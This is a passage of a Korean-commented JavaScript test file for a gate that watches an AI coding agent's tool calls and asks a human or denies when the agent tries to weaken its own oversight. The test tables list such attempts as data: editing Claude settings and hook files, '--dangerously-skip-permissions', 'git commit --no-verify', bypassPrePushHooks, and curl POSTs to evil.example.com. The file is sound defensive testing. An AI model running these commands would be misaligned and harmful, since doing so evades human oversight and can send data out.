/**
 * `lib/security/human-gate-enforce.js` 표 테스트 — 강제 판정 코어(CA-04 L1).
 *
 * 여기서 보는 것: HG-07·HG-12·HG-13 의 양성/음성 표, 보호 범위 술어
 * `isClaudeConfigPath`(Windows 경로 3형 포함), enforce 기본 off 핀, askHonoredModes
 * allowlist, 설정 검증(`validateEnforceConfig`), 결과 어휘, 순수성 소스 스캔(+스캐너
 * 자기검증), 새 정규식의 긴 단일 런 스윕.
 *
 * 이 파일이 못 보는 것: 훅 배선(L2 — 호출자 0), 실제 명령 분포에서의 오탐·미탐률
 * (코퍼스 없음), 호스트가 `ask` 를 실제로 존중하는 권한 모드 집합(L0 프로브 몫),
 * 모듈 헤더 "이 설계가 못 보는 것" 1~7 의 우회 형(간접 쓰기 등 — 설계상 비범위).
 */

import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import {
  decideHumanGate,
  ENFORCE_CONFIG_PATH,
  ENFORCE_DECISIONS,
  ENFORCE_DEFAULTS,
  ENFORCE_PATTERNS,
  ENFORCE_REASONS,
  ENFORCEABLE_GATE_IDS,
  evaluateMatrix,
  HG07_CURL_PATTERN_INDEX,
  isClaudeConfigPath,
  MATRIX_PATTERN_SUBSTITUTES,
  readEnforceConfig,
  resolveEnforceConfig,
  validateEnforceConfig,
} from '../../lib/security/human-gate-enforce.js';
import { classify, getGateRow, HUMAN_GATE_MATRIX } from '../../lib/security/human-gates.js';
import { findUnboundedRuns } from '../helpers/regex-scan.js';

// ── 픽스처 경로 ────────────────────────────────────────────────────────────
// Windows 경로는 조각으로 조립한다(land 인용 게이트가 드라이브+사용자 폴더 리터럴을 거부).
const win = (...segs) => segs.join('\\');
const HOME = ['C:', 'Users', 'HeechangLee'];
const HOME_83 = ['C:', 'Users', 'HEECHA~1'];
const REPO = [...HOME, 'Desktop', 'AI', 'Artibot'];
const CACHE_ROOT = win(...HOME, '.claude', 'plugins', 'cache', 'artibot', 'artibot', '4.67.0');
const SOURCE_ROOT = win(...REPO, 'plugins', 'artibot');
const WORKTREE_SOURCE_ROOT = win(...REPO, '.claude', 'worktrees', 'x', 'plugins', 'artibot');

/** @param {object} enforce */
const configWith = (enforce) => ({ permissions: { autoApprove: [], humanGates: { enforce } } });

const ENFORCE_ALL = configWith({
  enabled: true,
  mode: 'enforce',
  gates: ['HG-07', 'HG-12', 'HG-13'],
  askHonoredModes: ['default', 'acceptEdits'],
});

/** 기본값: 강제 켠 합성 config · 권한 모드 default · pluginRoot = 설치 캐시. */
const decide = (input) => decideHumanGate({
  permissionMode: 'default',
  pluginRoot: CACHE_ROOT,
  config: ENFORCE_ALL,
  ...input,
});

const hitIds = (result) => result.hits.map((h) => h.id);

// ── 판정 표 ────────────────────────────────────────────────────────────────
// 양성: 강제 켠 config 에서 'ask'. 음성: 매트릭스에는 걸리지만(또는 아예 안 걸려) 강제 안 함.

const HG12_POSITIVE = [
  ['8.3 단축형 홈의 사용자 settings.json (Write)', { tool: 'Write', path: win(...HOME_83, '.claude', 'settings.json') }],
  ['posix 홈 settings.local.json (Edit)', { tool: 'Edit', path: '/home/dev/.claude/settings.local.json' }],
  ['split worktree 자신의 .claude/settings.local.json', { tool: 'Write', path: win(...REPO, '.claude', 'worktrees', 'x', '.claude', 'settings.local.json') }],
  ['설치 캐시 hooks.json (.claude 세그먼트)', { tool: 'Edit', path: win(CACHE_ROOT, 'hooks', 'hooks.json') }],
  ['개발 설치 pluginRoot 아래 dispatch-table.json', { tool: 'Write', path: win(SOURCE_ROOT, 'hooks', 'dispatch-table.json'), pluginRoot: SOURCE_ROOT }],
  ['pluginRoot 가 그 worktree 소스 자신이면 소스 hooks.json 도 보호', { tool: 'Write', path: win(WORKTREE_SOURCE_ROOT, 'hooks', 'hooks.json'), pluginRoot: WORKTREE_SOURCE_ROOT }],
  ['Bash 리다이렉트 뒤 체인 — $ 앵커 classify 가 놓치는 형', { tool: 'Bash', command: 'echo {} > ~/.claude/settings.json && echo done' }],
  ['Bash --dangerously-skip-permissions', { tool: 'Bash', command: 'claude --dangerously-skip-permissions -p "hi"' }],
  ['Bash 백슬래시 경로로 cp', { tool: 'Bash', command: `cp x.json ${win(...HOME, '.claude', 'dispatch-table.json')}` }],
];

const HG12_NEGATIVE = [
  ['.vscode/settings.json (Write)', { tool: 'Write', path: '.vscode/settings.json' }],
  ['리포 소스 plugins/artibot/hooks/hooks.json (Edit)', { tool: 'Edit', path: 'plugins/artibot/hooks/hooks.json' }],
  ['split worktree 안 소스 경로 (pluginRoot = 설치 캐시)', { tool: 'Write', path: win(...REPO, '.claude', 'worktrees', 'x', 'plugins', 'artibot', 'hooks', 'hooks.json') }],
  ['Bash 읽기 전용 cat', { tool: 'Bash', command: 'cat ~/.claude/settings.json' }],
  ['Bash git diff', { tool: 'Bash', command: 'git diff -- .claude/settings.local.json' }],
  ['Bash grep 로 플래그 검색', { tool: 'Bash', command: 'grep -rn -- --dangerously-skip-permissions docs/' }],
  ['Bash .vscode 로 리다이렉트', { tool: 'Bash', command: 'echo {} > .vscode/settings.json' }],
];

const HG13_POSITIVE = [
  ['설치 캐시 artibot.config.json (Write)', { tool: 'Write', path: win(CACHE_ROOT, 'artibot.config.json') }],
  ['개발 설치 pluginRoot 아래 artibot.config.json (Edit)', { tool: 'Edit', path: win(SOURCE_ROOT, 'artibot.config.json'), pluginRoot: SOURCE_ROOT }],
  ['git commit --no-verify', { tool: 'Bash', command: 'git commit --no-verify -m "wip"' }],
  ['git -C 경로 push --no-verify', { tool: 'Bash', command: 'git -C ../repo push --no-verify origin feat' }],
  ['bypassPrePushHooks true 설정', { tool: 'Bash', command: 'git config artibot.bypassPrePushHooks true' }],
  ['Bash 로 설치 캐시 설정 덮어쓰기 뒤 체인', { tool: 'Bash', command: `node gen.js > ${win(CACHE_ROOT, 'artibot.config.json')}; echo ok` }],
];

const HG13_NEGATIVE = [
  ['리포 소스 artibot.config.json (pluginRoot = 설치 캐시)', { tool: 'Write', path: 'plugins/artibot/artibot.config.json' }],
  ['split worktree 안 소스 artibot.config.json', { tool: 'Edit', path: win(...REPO, '.claude', 'worktrees', 'x', 'plugins', 'artibot', 'artibot.config.json') }],
  ['grep 로 --no-verify 검색', { tool: 'Bash', command: 'grep -rn -- --no-verify lib/' }],
  ['git log --grep', { tool: 'Bash', command: 'git log --oneline --grep=--no-verify' }],
  ['echo 인용', { tool: 'Bash', command: 'echo "bypassPrePushHooks: true"' }],
];

const HG07_POSITIVE = [
  ['외부 호스트 POST', 'curl -X POST https://api.example.com/v1/items'],
  ['loopback + 외부 혼재', 'curl -X POST http://127.0.0.1:8080/a https://evil.example.com/b'],
  ['userinfo 로 loopback 위장', 'curl -X POST http://127.0.0.1@evil.example.com/'],
  ['스킴 없는 외부 호스트', 'curl -X POST example.com/hook'],
  ['URL 없음 — loopback 을 증명 못 함', 'curl -X POST "$HOOK_URL"'],
  ['loopback 이어도 --proxy 가 외부', 'curl -X POST --proxy proxy.example.com:3128 http://127.0.0.1/x'],
  ['gh pr merge', 'gh pr merge 12 --squash'],
  ['git push main', 'git push origin main'],
];

const HG07_NEGATIVE = [
  ['loopback curl -X POST http://127.0.0.1', 'curl -X POST http://127.0.0.1'],
  ['localhost + 헤더·본문', `curl -X POST http://localhost:3000/api -H 'Content-Type: application/json' -d '{"a":1}'`],
  ['IPv6 ::1', `curl -X POST 'http://[::1]:8080/x'`],
  ['127/8 대역 + -o 출력 파일', 'curl -X POST http://127.1.2.3/x -o out.json'],
  ['grep 인용 gh pr merge', 'grep -rn "gh pr merge" docs'],
];

describe('decideHumanGate — HG-12 권한 상승 표', () => {
  it.each(HG12_POSITIVE)('양성: %s → ask', (_label, input) => {
    const result = decide(input);
    expect(result.decision).toBe('ask');
    expect(result.gate).toBe('HG-12');
  });

  it.each(HG12_NEGATIVE)('음성: %s → 강제 안 함 (HG-12 적중은 기록)', (_label, input) => {
    const result = decide(input);
    expect(hitIds(result)).toContain('HG-12');
    expect(result.decision).toBe('record');
  });
});

describe('decideHumanGate — HG-13 보안 정책 비활성화 표', () => {
  it.each(HG13_POSITIVE)('양성: %s → ask', (_label, input) => {
    const result = decide(input);
    expect(result.decision).toBe('ask');
    expect(result.gate).toBe('HG-13');
  });

  it.each(HG13_NEGATIVE)('음성: %s → 강제 안 함 (HG-13 적중은 기록)', (_label, input) => {
    const result = decide(input);
    expect(hitIds(result)).toContain('HG-13');
    expect(result.decision).toBe('record');
  });
});

describe('decideHumanGate — HG-07 외부 시스템 쓰기 표', () => {
  it.each(HG07_POSITIVE)('양성: %s → ask', (_label, command) => {
    const result = decide({ tool: 'Bash', command });
    expect(result.decision).toBe('ask');
    expect(result.gate).toBe('HG-07');
  });

  it.each(HG07_NEGATIVE)('음성: %s → 강제 안 함 (HG-07 적중은 기록)', (_label, command) => {
    const result = decide({ tool: 'Bash', command });
    expect(hitIds(result)).toContain('HG-07');
    expect(result.decision).toBe('record');
  });

  it('HG-07 은 출하 gates 초기값(HG-12·HG-13)에 없으면 기록만 한다 (오너 결정 O2 대기)', () => {
    const config = configWith({ enabled: true, mode: 'enforce', gates: ['HG-12', 'HG-13'], askHonoredModes: ['default'] });
    const result = decide({ tool: 'Bash', command: 'gh pr merge 1', config });
    expect(result.decision).toBe('record');
    expect(result.reason).toBe('gate-not-configured');
  });

  it('curl 패턴 인덱스 결합 핀 — HG-07 patterns[HG07_CURL_PATTERN_INDEX] 가 curl 행이다', () => {
    expect(getGateRow('HG-07').patterns[HG07_CURL_PATTERN_INDEX].source.startsWith('\\bcurl\\b')).toBe(true);
  });
});

describe('Bash 면제 allowlist — 면제를 좁히는 조건', () => {
  it.each([
    ['git diff --output= 는 파일을 쓴다', 'git diff --output=.claude/settings.json'],
    ['rg --pre 는 명령을 실행한다', 'rg --pre=./x.sh foo ~/.claude/settings.json'],
    ['git -c 는 설정 주입(pager 등 실행)', 'git -c core.pager=./x.sh log -- ~/.claude/settings.json'],
    ['tee 단어', 'cat tee ~/.claude/settings.json'],
    ['-i (브리프 지정 — grep -i 는 과보호 거짓 양성)', 'grep -i x ~/.claude/settings.json'],
    ['명령 치환', 'cat $(echo ~/.claude/settings.json)'],
    ['체인 두 번째 세그먼트', 'cat ~/.claude/settings.json && true'],
    ['allowlist 밖 선두 동사', 'less ~/.claude/settings.json'],
  ])('%s → 면제 안 됨(ask)', (_label, command) => {
    const result = decide({ tool: 'Bash', command });
    expect(result.decision).toBe('ask');
    expect(result.gate).toBe('HG-12');
  });

  it.each([
    ['경로 붙은 동사', '/usr/bin/cat ~/.claude/settings.json'],
    ['git -C <path> show', 'git -C ../repo show HEAD:.claude/settings.json'],
    ['git --no-pager log', 'git --no-pager log -- .claude/settings.json'],
  ])('%s → 면제(record)', (_label, command) => {
    expect(decide({ tool: 'Bash', command }).decision).toBe('record');
  });
});

describe('decideHumanGate — 판정 대상 밖 행과 무적중', () => {
  it('HG-07/12/13 밖 행 적중은 기록만 한다 (row-not-enforceable)', () => {
    const result = decide({ tool: 'Bash', command: 'terraform apply' });
    expect(hitIds(result)).toEqual(['HG-08']);
    expect(result.decision).toBe('record');
    expect(result.reason).toBe('row-not-enforceable');
  });

  it('매트릭스 무적중은 pass', () => {
    const result = decide({ tool: 'Bash', command: 'npm --version' });
    expect(result).toMatchObject({ decision: 'pass', wouldDecide: 'pass', gate: null, reason: 'no-hit' });
  });

  it.each([
    ['인자 없음', undefined],
    ['null', null],
    ['tool 없음', { command: 'git commit --no-verify' }],
    ['tool 비문자열', { tool: 42, command: 'git commit --no-verify' }],
  ])('잘못된 입력(%s)은 pass/invalid-input', (_label, input) => {
    expect(decideHumanGate(input)).toMatchObject({ decision: 'pass', reason: 'invalid-input' });
  });

  it('HG-12/13 도구 allowlist 밖 도구는 강제하지 않는다', () => {
    const result = decide({ tool: 'NotebookEdit', path: win(...HOME, '.claude', 'settings.json') });
    expect(['pass', 'record']).toContain(result.decision);
  });
});

describe('isClaudeConfigPath — 보호 범위 술어', () => {
  const opts = { pluginRoot: CACHE_ROOT };

  it.each([
    ['백슬래시 Windows 경로', win(...HOME, '.claude', 'settings.json'), opts],
    ['드라이브·경로 대소문자 혼합', win('c:', 'USERS', 'heechanglee', '.CLAUDE', 'Settings.Local.JSON'), opts],
    ['소문자 드라이브 경로 vs 대문자 드라이브 pluginRoot', win('c:', 'users', 'heechanglee', 'desktop', 'ai', 'artibot', 'plugins', 'artibot', 'hooks', 'hooks.json'), { pluginRoot: SOURCE_ROOT }],
    ['8.3 단축형 홈의 .claude', win(...HOME_83, '.claude', 'settings.local.json'), opts],
    ['구분자 혼합·연속 슬래시', `${win(...HOME)}\\\\.claude//settings.json`, opts],
    ['msys 드라이브 형(/c/…) vs Windows pluginRoot', `/c/${['Users', 'HeechangLee', 'Desktop', 'AI', 'Artibot', 'plugins', 'artibot', 'hooks', 'hooks.json'].join('/')}`, { pluginRoot: SOURCE_ROOT }],
    ['.. 로 worktree 접두를 벗어난 경로', '.claude/worktrees/x/../../settings.json', opts],
    ['worktree 자신의 .claude/settings.local.json', '.claude/worktrees/x/.claude/settings.local.json', opts],
    ['설치 캐시 artibot.config.json', win(CACHE_ROOT, 'artibot.config.json'), opts],
  ])('보호: %s', (_label, p, options) => {
    expect(isClaudeConfigPath(p, options)).toBe(true);
  });

  it.each([
    ['.vscode/settings.json', '.vscode/settings.json', opts],
    ['리포 소스 hooks.json', 'plugins/artibot/hooks/hooks.json', opts],
    ['split worktree 안 소스 경로', win(...REPO, '.claude', 'worktrees', 'x', 'plugins', 'artibot', 'hooks', 'hooks.json'), opts],
    ['worktree 루트의 settings.json (.claude 아님)', '.claude/worktrees/x/settings.json', opts],
    ['보호 basename 아님', win(...HOME, '.claude', 'commands', 'foo.md'), opts],
    ['basename 접미 변형', '.claude/settings.json.bak', opts],
    ['상대 pluginRoot 는 무시한다', 'plugins/artibot/hooks/hooks.json', { pluginRoot: 'plugins/artibot' }],
    ['pluginRoot 미주입', win(...REPO, 'plugins', 'artibot', 'hooks', 'hooks.json'), {}],
    ['빈 문자열', '', opts],
    ['비문자열', 42, opts],
  ])('비보호: %s', (_label, p, options) => {
    expect(isClaudeConfigPath(p, options)).toBe(false);
  });

  it('못 보는 것 핀: 8.3 단축형 경로 vs 긴 이름 pluginRoot 는 같은 폴더여도 비보호로 본다', () => {
    // 순수 함수라 8.3 이름을 풀 수 없다(파일시스템 조회 필요). .claude 세그먼트가 없으면 놓친다.
    const p = win(...HOME_83, 'Desktop', 'AI', 'Artibot', 'plugins', 'artibot', 'hooks', 'hooks.json');
    expect(isClaudeConfigPath(p, { pluginRoot: SOURCE_ROOT })).toBe(false);
  });
});

describe('enforce 기본 off 핀 — 출하 artibot.config.json', () => {
  const shipped = JSON.parse(readFileSync(new URL('../../artibot.config.json', import.meta.url), 'utf8'));
  const allPositive = [
    ...HG12_POSITIVE.map(([, input]) => input),
    ...HG13_POSITIVE.map(([, input]) => input),
    ...HG07_POSITIVE.map(([, command]) => ({ tool: 'Bash', command })),
  ];

  it('출하 config 의 enforce 는 부재이거나 enabled !== true 이고, 검증을 통과한다', () => {
    const enforce = readEnforceConfig(shipped);
    expect(enforce === undefined || enforce.enabled !== true).toBe(true);
    expect(validateEnforceConfig(enforce)).toEqual([]);
  });

  it('출하 config 로는 양성 표 전부가 강제 결정(ask/deny)을 내지 않는다', () => {
    for (const input of allPositive) {
      for (const permissionMode of ['default', 'bypassPermissions', undefined]) {
        const result = decideHumanGate({ ...input, permissionMode, pluginRoot: CACHE_ROOT, config: shipped });
        expect(['pass', 'record']).toContain(result.decision);
      }
    }
  });

  it('키 부재 config 는 강제하지 않는다 (부재 = ENFORCE_DEFAULTS = 꺼짐)', () => {
    for (const config of [undefined, {}, { permissions: { autoApprove: [] } }, { permissions: { humanGates: {} } }]) {
      const result = decide({ tool: 'Write', path: win(CACHE_ROOT, 'artibot.config.json'), config });
      expect(result.decision).toBe('record');
      expect(result.reason).toBe('enforce-disabled');
      expect(result.configErrors).toEqual([]);
    }
  });

  it('enabled:false 합성 config 는 강제하지 않되, 강제 시 결정을 wouldDecide 로 남긴다', () => {
    const config = configWith({ enabled: false, mode: 'enforce', gates: ['HG-12', 'HG-13'], askHonoredModes: ['default'] });
    const result = decide({ tool: 'Write', path: win(CACHE_ROOT, 'artibot.config.json'), config });
    expect(result).toMatchObject({ decision: 'record', wouldDecide: 'ask', reason: 'enforce-disabled', gate: 'HG-13' });
    expect(result.configErrors).toEqual([]);
  });

  it("mode:'shadow' 는 기록하고 wouldDecide 에 강제 시 결정을 남긴다", () => {
    const config = configWith({ enabled: true, mode: 'shadow', gates: ['HG-12', 'HG-13'], askHonoredModes: ['default'] });
    const asked = decide({ tool: 'Bash', command: 'git commit --no-verify', config });
    expect(asked).toMatchObject({ decision: 'record', wouldDecide: 'ask', reason: 'shadow-mode' });
    const denied = decide({ tool: 'Bash', command: 'git commit --no-verify', config, permissionMode: 'bypassPermissions' });
    expect(denied).toMatchObject({ decision: 'record', wouldDecide: 'deny', reason: 'shadow-mode' });
  });
});

describe('스위치 3경우 핀 — 키 부재 / enabled:false / enabled:true (양성 대조)', () => {
  const inputs = [
    { tool: 'Write', path: win(CACHE_ROOT, 'artibot.config.json') },
    { tool: 'Bash', command: 'git commit --no-verify -m x' },
    { tool: 'Edit', path: win(...HOME, '.claude', 'settings.json') },
  ];
  const cases = [
    ['키 부재', {}, ['record']],
    ['enabled:false', configWith({ enabled: false }), ['record']],
    ['enabled:true + mode enforce (나머지 키는 기본값)', configWith({ enabled: true, mode: 'enforce' }), ['deny']],
  ];

  it.each(cases)('%s', (_label, config, allowed) => {
    for (const input of inputs) {
      for (const permissionMode of ['default', 'bypassPermissions']) {
        const result = decideHumanGate({ ...input, permissionMode, pluginRoot: CACHE_ROOT, config });
        expect(allowed).toContain(result.decision);
        expect(result.wouldDecide).toBe('deny');
      }
    }
  });

  it('기본 askHonoredModes 는 [] 이라 enabled:true 만으로는 ask 가 안 나온다 — ask 는 합성 config 로만', () => {
    const config = configWith({ enabled: true, mode: 'enforce', askHonoredModes: ['default'] });
    expect(decideHumanGate({ ...inputs[1], permissionMode: 'default', config }).decision).toBe('ask');
  });
});

describe('ENFORCE_DEFAULTS · resolveEnforceConfig — 부재·부분 설정 해석', () => {
  it('기본값은 꺼짐·shadow·gates 정확 집합 HG-12/HG-13·askHonoredModes [] 이고 검증을 통과한다', () => {
    expect(ENFORCE_DEFAULTS).toEqual({ enabled: false, mode: 'shadow', gates: ['HG-12', 'HG-13'], askHonoredModes: [] });
    expect(Object.isFrozen(ENFORCE_DEFAULTS)).toBe(true);
    expect(Object.isFrozen(ENFORCE_DEFAULTS.gates)).toBe(true);
    expect(Object.isFrozen(ENFORCE_DEFAULTS.askHonoredModes)).toBe(true);
    const matrixIds = HUMAN_GATE_MATRIX.map((row) => row.id);
    for (const id of ENFORCE_DEFAULTS.gates) expect(matrixIds).toContain(id);
    expect(ENFORCE_DEFAULTS.gates).not.toContain('HG-07');
    expect(validateEnforceConfig(ENFORCE_DEFAULTS)).toEqual([]);
  });

  it('ENFORCE_DEFAULTS 블록을 그대로 config 에 넣은 합성은 강제 결정(ask/deny)을 내지 않는다', () => {
    const config = configWith({ ...ENFORCE_DEFAULTS });
    const inputs = [
      ...[...HG12_POSITIVE, ...HG13_POSITIVE].map(([, input]) => input),
      ...HG07_POSITIVE.map(([, command]) => ({ tool: 'Bash', command })),
    ];
    for (const input of inputs) {
      for (const permissionMode of ['default', 'bypassPermissions', undefined]) {
        const result = decideHumanGate({ ...input, permissionMode, pluginRoot: CACHE_ROOT, config });
        expect(['pass', 'record']).toContain(result.decision);
        expect(result.configErrors).toEqual([]);
      }
    }
  });

  it('키 부재 → 기본값 그대로, present:false, errors []', () => {
    expect(resolveEnforceConfig({})).toEqual({ present: false, errors: [], ...ENFORCE_DEFAULTS });
    expect(Object.isFrozen(resolveEnforceConfig({}))).toBe(true);
  });

  it('부분 설정 → 있는 키만 덮고 나머지는 기본값', () => {
    expect(resolveEnforceConfig(configWith({ enabled: true, gates: ['HG-07'] }))).toEqual({
      present: true, errors: [], enabled: true, mode: 'shadow', gates: ['HG-07'], askHonoredModes: [],
    });
  });

  it('이상값 → errors 노출, 값은 가장 약한 쪽(enabled 는 === true 만 켜짐, 판정 대상 밖 gate 는 제외)', () => {
    const resolved = resolveEnforceConfig(configWith({ enabled: 'true', gates: ['HG-99', 'HG-13'], askHonoredModes: 'default' }));
    expect(resolved.enabled).toBe(false);
    expect(resolved.gates).toEqual(['HG-13']);
    expect(resolved.askHonoredModes).toEqual([]);
    expect(resolved.errors.length).toBeGreaterThanOrEqual(3);
  });
});

describe('evaluateMatrix — classify 와의 동치 (HG-13[2] 대체 매처 포함)', () => {
  const corpus = [
    ...[...HG12_POSITIVE, ...HG12_NEGATIVE, ...HG13_POSITIVE, ...HG13_NEGATIVE].map(([, input]) => input),
    ...[...HG07_POSITIVE, ...HG07_NEGATIVE].map(([, command]) => ({ tool: 'Bash', command })),
    { tool: 'Bash', command: 'terraform apply' },
    { tool: 'Bash', command: 'cat .env' },
    { tool: 'Bash', command: "UPDATE t SET a=1" },
    { tool: 'Write', path: 'lib/foo.js' },
    { tool: 'Bash', command: '{"bypassPrePushHooks": true}' },
    { tool: 'Bash', command: 'bypassPreCommitHooks=true' },
    { tool: 'Bash', command: "bypassPrePushHooks: 'true'" },
    { tool: 'Bash', command: 'bypassPrePushHooks = true' },
    { tool: 'Bash', command: 'bypassPrePushHooks: false' },
    { tool: 'Bash', command: 'bypassPrePushHooks: trueish' },
    { tool: 'UnknownTool', command: 'terraform apply' },
  ];

  it.each(corpus.map((input) => [JSON.stringify(input).slice(0, 80), input]))('%s', (_label, input) => {
    expect(evaluateMatrix(input)).toEqual(classify(input).hits.map((hit) => hit.id));
  });

  it('대체 등록은 HG-13[2] 하나뿐이고 그 원본이 bypassPre 행이다', () => {
    expect(Object.keys(MATRIX_PATTERN_SUBSTITUTES)).toEqual(['HG-13[2]']);
    expect(getGateRow('HG-13').patterns[2].source).toContain('bypassPre');
    const ids = ENFORCE_PATTERNS.map((entry) => entry.id);
    for (const substitute of Object.values(MATRIX_PATTERN_SUBSTITUTES)) expect(ids).toContain(substitute);
  });

  it('못 보는 것 핀: 구분자가 16자를 넘으면 대체 매처는 놓친다 (원본은 잡는다)', () => {
    const input = { tool: 'Bash', command: `bypassPrePushHooks${' '.repeat(17)}true` };
    expect(classify(input).hits.map((hit) => hit.id)).toContain('HG-13');
    expect(evaluateMatrix(input)).not.toContain('HG-13');
  });
});

describe('askHonoredModes — allowlist (목록 밖·부재·비문자열 → deny)', () => {
  const input = { tool: 'Bash', command: 'git commit --no-verify -m x' };

  it.each([
    ['default', 'ask'],
    ['acceptEdits', 'ask'],
    ['bypassPermissions', 'deny'],
    ['plan', 'deny'],
    ['DEFAULT', 'deny'],
    ['', 'deny'],
    [undefined, 'deny'],
    [null, 'deny'],
    [42, 'deny'],
    [['default'], 'deny'],
  ])('permissionMode=%j → %s', (permissionMode, expected) => {
    const result = decide({ ...input, permissionMode });
    expect(result.decision).toBe(expected);
    expect(result.reason).toBe(expected === 'ask' ? 'mode-ask-honored' : 'mode-not-ask-honored');
  });

  it('askHonoredModes 가 빈 배열이면 모든 모드가 deny', () => {
    const config = configWith({ enabled: true, mode: 'enforce', gates: ['HG-13'], askHonoredModes: [] });
    expect(decide({ ...input, config }).decision).toBe('deny');
  });
});

describe('설정 이상값 — 강제 안 함 + configErrors 노출', () => {
  const base = { enabled: true, mode: 'enforce', gates: ['HG-12', 'HG-13'], askHonoredModes: ['default'] };
  const input = { tool: 'Write', path: win(CACHE_ROOT, 'artibot.config.json') };

  it.each([
    ['미지 mode', { ...base, mode: 'enforcee' }, 'config-invalid'],
    ['미지 게이트 id', { ...base, gates: ['HG-99', 'HG-13'] }, 'config-invalid'],
    ['미지 키(오타)', { ...base, enabeld: true }, 'config-invalid'],
    ['gates 비배열', { ...base, gates: 'HG-13' }, 'config-invalid'],
    ['enabled 비불리언', { ...base, enabled: 'true' }, 'enforce-disabled'],
  ])('%s → record', (_label, enforce, reason) => {
    const result = decide({ ...input, config: configWith(enforce) });
    expect(result.decision).toBe('record');
    expect(result.reason).toBe(reason);
    expect(result.configErrors.length).toBeGreaterThan(0);
  });

  it('enforce 가 null 이면 오류를 노출하고 강제하지 않는다', () => {
    const result = decide({ ...input, config: configWith(null) });
    expect(result.decision).toBe('record');
    expect(result.configErrors).toEqual(['enforce: must be an object']);
  });
});

describe('validateEnforceConfig', () => {
  const valid = { enabled: false, mode: 'shadow', gates: ['HG-12', 'HG-13'], askHonoredModes: ['default'] };

  it('정상 설정·부분 설정·부재(undefined)는 위반 0', () => {
    expect(validateEnforceConfig(valid)).toEqual([]);
    expect(validateEnforceConfig({ enabled: true })).toEqual([]);
    expect(validateEnforceConfig({})).toEqual([]);
    expect(validateEnforceConfig({ ...valid, gates: ['HG-07', 'HG-12', 'HG-13'], enabled: true, mode: 'enforce' })).toEqual([]);
    expect(validateEnforceConfig(undefined)).toEqual([]);
  });

  it.each([
    ['미지 게이트 id', { ...valid, gates: ['HG-99'] }, 'HG-99'],
    ['매트릭스엔 있으나 판정 대상 아님', { ...valid, gates: ['HG-01'] }, 'not enforceable'],
    ['중복 게이트', { ...valid, gates: ['HG-12', 'HG-12'] }, 'duplicate'],
    ['비문자열 게이트', { ...valid, gates: [12] }, 'gates[0]'],
    ['gates 비배열', { ...valid, gates: 'HG-12' }, 'gates'],
    ['미지 mode', { ...valid, mode: 'enforcee' }, 'enforcee'],
    ['비불리언 enabled', { ...valid, enabled: 'yes' }, 'enabled'],
    ['askHonoredModes 비배열', { ...valid, askHonoredModes: 'default' }, 'askHonoredModes'],
    ['askHonoredModes 빈 문자열', { ...valid, askHonoredModes: [''] }, 'askHonoredModes[0]'],
    ['미지 키', { ...valid, enabeld: true }, 'enabeld'],
    ['비객체', 'on', 'object'],
    ['배열', [], 'object'],
  ])('%s → 거부', (_label, enforce, needle) => {
    const errors = validateEnforceConfig(enforce);
    expect(errors.length).toBeGreaterThan(0);
    expect(errors.join('\n')).toContain(needle);
  });

  it('matrix 인자를 따른다 — 매트릭스에 없는 id 는 미지 게이트', () => {
    const matrix = HUMAN_GATE_MATRIX.filter((row) => row.id !== 'HG-07');
    expect(validateEnforceConfig({ ...valid, gates: ['HG-07'] }, matrix).join('\n')).toContain('unknown gate id');
  });
});

describe('결과 모양 · 어휘 allowlist', () => {
  it('상수 어휘가 고정돼 있다', () => {
    expect(ENFORCE_DECISIONS).toEqual(['pass', 'record', 'ask', 'deny']);
    expect(ENFORCEABLE_GATE_IDS).toEqual(['HG-07', 'HG-12', 'HG-13']);
    expect(ENFORCE_CONFIG_PATH).toEqual(['permissions', 'humanGates', 'enforce']);
    const matrixIds = HUMAN_GATE_MATRIX.map((row) => row.id);
    for (const id of ENFORCEABLE_GATE_IDS) expect(matrixIds).toContain(id);
  });

  it('모든 표 결과는 frozen 이고 결정·사유가 allowlist 안에 있다', () => {
    const inputs = [
      ...[...HG12_POSITIVE, ...HG12_NEGATIVE, ...HG13_POSITIVE, ...HG13_NEGATIVE].map(([, input]) => input),
      ...[...HG07_POSITIVE, ...HG07_NEGATIVE].map(([, command]) => ({ tool: 'Bash', command })),
    ];
    for (const input of inputs) {
      const result = decide(input);
      expect(Object.isFrozen(result)).toBe(true);
      expect(Object.isFrozen(result.hits)).toBe(true);
      expect(Object.isFrozen(result.configErrors)).toBe(true);
      expect(ENFORCE_DECISIONS).toContain(result.decision);
      expect(ENFORCE_DECISIONS).toContain(result.wouldDecide);
      expect(ENFORCE_REASONS).toContain(result.reason);
      for (const hit of result.hits) {
        expect(Object.isFrozen(hit)).toBe(true);
        expect(ENFORCE_REASONS).toContain(hit.reason);
      }
    }
  });
});

// ── 순수성 핀 ──────────────────────────────────────────────────────────────

const FORBIDDEN_IN_PURE_SOURCE = [
  ['process.', /\bprocess\s*\./],
  ['require(', /\brequire\s*\(/],
  ['dynamic import(', /\bimport\s*\(/],
  ["from 'node:*'", /\bfrom\s*['"]node:/],
  ["from 'fs'|'path'|'os'|'child_process'", /\bfrom\s*['"](?:fs|path|os|child_process)(?:\/[a-z]+)?['"]/],
  ['Date', /\bDate\b/],
  ['Math.random', /\bMath\s*\.\s*random\b/],
  ['globalThis', /\bglobalThis\b/],
];

/** 블록·줄 주석을 지운다. `://` 뒤의 `//` 는 주석으로 보지 않는다. */
const stripComments = (source) => source
  .replace(/\/\*[\s\S]*?\*\//g, '')
  .replace(/(^|[^:\\])\/\/[^\n]*/g, '$1');

const scanPurity = (source) => {
  const code = stripComments(source);
  return FORBIDDEN_IN_PURE_SOURCE.filter(([, re]) => re.test(code)).map(([label]) => label);
};

describe('순수성 핀 — I/O·env·시계·난수·node 내장 로딩 0', () => {
  it('모듈 소스(주석 제거 후)에 금지 토큰이 없다', () => {
    const source = readFileSync(new URL('../../lib/security/human-gate-enforce.js', import.meta.url), 'utf8');
    expect(source.length).toBeGreaterThan(1000);
    expect(scanPurity(source)).toEqual([]);
  });

  it('스캐너 자기검증 — 깨진 합성 소스에서 각 금지 토큰을 잡는다', () => {
    const broken = [
      ['process.', 'const a = process.env.CLAUDE_PLUGIN_ROOT;'],
      ['require(', "const fs = require('fs');"],
      ['dynamic import(', "const m = await import('./x.js');"],
      ["from 'node:*'", "import { readFileSync } from 'node:fs';"],
      ["from 'fs'|'path'|'os'|'child_process'", "import path from 'path';"],
      ['Date', 'const now = new Date();'],
      ['Math.random', 'const r = Math.random();'],
      ['globalThis', 'const g = globalThis.x;'],
    ];
    for (const [label, source] of broken) {
      expect(scanPurity(source)).toEqual([label]);
    }
  });

